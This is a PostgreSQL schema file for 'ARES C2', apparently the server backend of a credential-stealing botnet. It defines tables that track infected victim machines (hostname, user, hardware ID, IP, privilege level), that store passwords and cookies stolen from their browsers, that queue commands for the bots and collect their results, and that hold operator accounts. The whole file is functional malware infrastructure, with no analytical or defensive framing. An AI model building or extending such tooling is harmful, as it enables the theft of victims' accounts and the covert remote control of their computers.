-- ARES C2 — PostgreSQL Schema (v5.0 Overhaul)
-- Run: psql -U ares -d ares -f 001_initial.sql

CREATE TABLE IF NOT EXISTS bots (
    id          TEXT PRIMARY KEY,
    hostname    TEXT NOT NULL,
    username    TEXT NOT NULL,
    domain      TEXT DEFAULT '',
    os          TEXT DEFAULT '',
    arch        TEXT DEFAULT '',
    pid         INTEGER DEFAULT 0,
    hwid        TEXT DEFAULT '',
    external_ip TEXT DEFAULT '',
    elevated    BOOLEAN DEFAULT FALSE,
    status      TEXT DEFAULT 'active',
    first_seen  TIMESTAMPTZ DEFAULT NOW(),
    last_seen   TIMESTAMPTZ DEFAULT NOW(),
    country     TEXT DEFAULT 'XX'
);

CREATE TABLE IF NOT EXISTS credentials (
    id          SERIAL PRIMARY KEY,
    bot_id      TEXT REFERENCES bots(id) ON DELETE CASCADE,
    type        TEXT NOT NULL,
    browser     TEXT DEFAULT '',
    profile     TEXT DEFAULT '',
    url         TEXT DEFAULT '',
    username    TEXT DEFAULT '',
    password_enc BYTEA,
    cookie_data_enc BYTEA,
    created_at  TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE(bot_id, type, url, username)
);

CREATE TABLE IF NOT EXISTS tasks (
    id          TEXT PRIMARY KEY,
    bot_id      TEXT REFERENCES bots(id) ON DELETE CASCADE,
    type        INTEGER NOT NULL,
    args        JSONB DEFAULT '[]',
    data        BYTEA,
    status      TEXT DEFAULT 'pending',
    created_at  TIMESTAMPTZ DEFAULT NOW(),
    completed_at TIMESTAMPTZ
);

CREATE TABLE IF NOT EXISTS task_results (
    id          SERIAL PRIMARY KEY,
    bot_id      TEXT REFERENCES bots(id) ON DELETE CASCADE,
    task_id     TEXT REFERENCES tasks(id),
    success     BOOLEAN DEFAULT FALSE,
    output_enc  BYTEA,
    error       TEXT DEFAULT '',
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS audit_log (
    id          SERIAL PRIMARY KEY,
    operator    TEXT NOT NULL,
    action      TEXT NOT NULL,
    detail      TEXT DEFAULT '',
    ip          TEXT DEFAULT '',
    created_at  TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS operators (
    username    TEXT PRIMARY KEY,
    pass_hash   TEXT NOT NULL,
    role        TEXT DEFAULT 'operator',
    created_at  TIMESTAMPTZ DEFAULT NOW(),
    last_login  TIMESTAMPTZ
);

-- Performance indexes
CREATE INDEX IF NOT EXISTS idx_bots_status ON bots(status);
CREATE INDEX IF NOT EXISTS idx_bots_last_seen ON bots(last_seen);
CREATE INDEX IF NOT EXISTS idx_creds_bot ON credentials(bot_id);
CREATE INDEX IF NOT EXISTS idx_creds_type ON credentials(type);
CREATE INDEX IF NOT EXISTS idx_tasks_bot_status ON tasks(bot_id, status);
CREATE INDEX IF NOT EXISTS idx_audit_time ON audit_log(created_at DESC);
